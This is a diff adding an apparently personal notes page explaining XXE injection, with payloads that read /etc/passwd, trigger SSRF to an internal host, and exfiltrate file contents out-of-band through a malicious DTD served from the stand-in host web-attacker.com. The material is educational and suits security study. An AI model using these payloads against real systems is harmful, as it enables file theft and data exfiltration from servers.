@@ -1,0 +1,60 @@
+<p>XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application’s processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any backend or external systems that the application itself can access.</p>
+
+<p>In some situations, an attacker can escalate an XXE attack to compromise the underlying server or other backend infrastructure, by leveraging the XXE vulnerability to perform server-side request forgery (SSRF) attacks.</p>
+
+<h2 id="types-of-xxe-attacks">types of xxe attacks</h2>
+<hr />
+<ul>
+  <li>retrive files</li>
+  <li>Exploiting XXE to perform SSRF attacks</li>
+  <li>Exploiting blind XXE exfiltrate data out-of-band</li>
+  <li>Exploiting blind XXE to retrieve data via error messages</li>
+</ul>
+
+<h2 id="exploiting-xxe-to-retrieve-files">Exploiting XXE to retrieve files</h2>
+<hr />
+<p>modify the xml in 2 ways:</p>
+<ul>
+  <li>Introduce (or edit) a DOCTYPE element that defines an external entity containing the path to the file.</li>
+  <li>Edit a data value in the XML that is returned in the application’s response, to make use of the defined external entity.</li>
+</ul>
+
+<p>For example, suppose a shopping application checks for the stock level of a product by submitting the following XML to the server:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="nt">&lt;stockCheck&gt;&lt;productId&gt;</span>381<span class="nt">&lt;/productId&gt;&lt;/stockCheck&gt;</span>
+</code></pre></div></div>
+<p>you can exploit it modifing the xml to:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</span> ]&gt;
+<span class="nt">&lt;stockCheck&gt;&lt;productId&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/productId&gt;&lt;/stockCheck&gt;</span>
+</code></pre></div></div>
+
+<p>This XXE payload defines an external entity <strong>&amp;xxe</strong>; whose value is the contents of the /etc/passwd file and uses the entity within the productId value.</p>
+
+<p>note: With real-world XXE vulnerabilities, there will often be a large number of data values within the submitted XML, any one of which might be used within the application’s response. To test systematically for XXE vulnerabilities, you will generally need to test each data node in the XML individually, by making use of your defined entity and seeing whether it appears within the response.</p>
+
+<h2 id="exploiting-xxe-to-perform-ssrf-attacks">Exploiting XXE to perform SSRF attacks</h2>
+<hr />
+<p>In the following XXE example, the external entity will cause the server to make a back-end HTTP request to an internal system within the organization’s infrastructure:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"&gt;</span> ]&gt;
+</code></pre></div></div>
+
+<h2 id="blind-xxe-vulnerabilities">Blind XXE vulnerabilities</h2>
+<hr />
+<h3 id="exploiting-blind-xxe-to-exfiltrate-data-out-of-band">Exploiting blind XXE to exfiltrate data out-of-band</h3>
+
+<p>Detecting a blind XXE vulnerability via out-of-band techniques is all very well, but it doesn’t actually demonstrate how the vulnerability could be exploited. What an attacker really wants to achieve is to exfiltrate sensitive data. This can be achieved via a blind XXE vulnerability, but it involves the attacker hosting a malicious DTD on a system that they control, and then invoking the external DTD from within the in-band XXE payload.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'&gt;"&gt;
+%eval;
+%exfiltrate;
+</code></pre></div></div>
+
+<p>The attacker must then host the malicious DTD on a system that they control, normally by loading it onto their own webserver. For example, the attacker might serve the malicious DTD at the following URL:</p>
+
+<p>http://web-attacker.com/malicious.dtd</p>
+
+<p>Finally, the attacker must submit the following XXE payload to the vulnerable application:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM
+"http://web-attacker.com/malicious.dtd"&gt;</span> %xxe;]&gt;
+</code></pre></div></div>
